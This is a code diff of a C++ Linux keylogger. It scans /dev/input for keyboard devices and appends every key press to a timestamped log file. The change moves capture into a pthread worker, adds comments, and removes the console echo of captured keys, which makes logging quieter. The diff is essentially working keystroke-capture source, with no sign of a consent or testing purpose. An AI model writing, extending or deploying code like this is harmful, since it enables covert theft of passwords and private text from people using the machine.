@@ -7,10 +7,10 @@
 #include <ctime>
 #include <iomanip>
 #include <cstring>
-
 #include <unistd.h>
 #include <fcntl.h>
 #include <dirent.h>
+
 #include <linux/input.h>
 #include <linux/version.h>
 #include <sys/ioctl.h>
@@ -196,10 +196,30 @@ const std::string keys[] = {
 const std::string DEV_INPUT_EVENT = "/dev/input/";
 const std::string EVENT_DEV_NAME = "event";
 
+class ThreadData {
+
+    public:
+    std::string keyboard;
+    std::string logFile;
+    int kbdFile;
+
+    ThreadData() {
+        kbdFile = -1;
+    }
+
+    ~ThreadData() {
+        close(kbdFile);
+    }
+
+    void openKbdFile() {
+        kbdFile = open(keyboard.c_str(), O_RDONLY);
+    }
+};
+
 
 static int is_event_device(const struct dirent *dir)
 {
-	return strncmp(EVENT_DEV_NAME.c_str(), dir->d_name, 5) == 0;
+    return strncmp(EVENT_DEV_NAME.c_str(), dir->d_name, 5) == 0;
 }
 
 
@@ -208,26 +228,29 @@ std::vector<std::string> getKeyboards()
     struct dirent **nameList;
     std::vector<std::string> keyboards;
 
+    // Get number and list of devices in input device directory
     int numDev = scandir(DEV_INPUT_EVENT.c_str(), &nameList, is_event_device, versionsort);
 
     for (int i=0; i < numDev; ++i) {
         std::string fname;
         char nameStr[256] = "???";
         char* name = nameStr;
-        int devFile = -1;
+        int kbdFile = -1;
 
+        // Get full input device path and open it
         std::string devName (nameList[i]->d_name);
         fname = DEV_INPUT_EVENT + devName;
+        kbdFile = open(fname.c_str(), O_RDONLY);
 
-        devFile = open(fname.c_str(), O_RDONLY);
-
-        if (devFile < 0) {
+        if (kbdFile < 0) {
             continue;
         }
 
-        ioctl(devFile, EVIOCGNAME(sizeof(nameStr)), name);
-        close(devFile);
+        // Get type of input device
+        ioctl(kbdFile, EVIOCGNAME(sizeof(nameStr)), name);
+        close(kbdFile);
 
+        // If the device type matches the regex pattern, add it to the vector
         std::regex kbdDevice(".*[Kk]eyboard.*");
         if (std::regex_match(name, kbdDevice)) keyboards.push_back(devName);
 
@@ -238,23 +261,33 @@ std::vector<std::string> getKeyboards()
 }
 
 
-void captureToLog(std::string inputDevice, std::string logPath)
+void *captureToLog(void* threadarg)
 {
-    int devFile, readDev;
+    // Retrieve and cast ThreadData instance from threadarg
+    ThreadData *threadData;
+    threadData = (ThreadData *) threadarg;
+
+    int readEvent;
     struct input_event keyEvent[64];
 
-    std::ofstream logFile (logPath.c_str(), std::ios::app);
-    devFile = open(inputDevice.c_str(), O_RDONLY);
+    // Open log file and keyboard device file
+    std::ofstream logFile (threadData->logFile.c_str(), std::ios::app);
+    threadData->openKbdFile();
 
-    std::time_t time = std::time(nullptr);
-    logFile << "\n| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
-        << "-------------------------------------\n";
+    if (threadData->kbdFile > 0) {
+        // Write timestamp
+        std::time_t time = std::time(nullptr);
+        logFile << "\n| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
+            << "-------------------------------------\n";
 
-    while (1) {
-        readDev = read(devFile, keyEvent, sizeof(struct input_event) * 64);
-        if (keyEvent[1].value !=1) {
-            logFile << keys[keyEvent[1].code] << std::endl;
-            std::cout << keys[keyEvent[1].code] << std::endl;
+        while (1) {
+            readEvent = read(threadData->kbdFile, keyEvent, sizeof(struct input_event) * 64);
+            // Ignore key releases
+            if (keyEvent[1].value !=1) {
+                logFile << keys[keyEvent[1].code] << std::endl;
+            }
         }
     }
+
+    pthread_exit(NULL);
 }
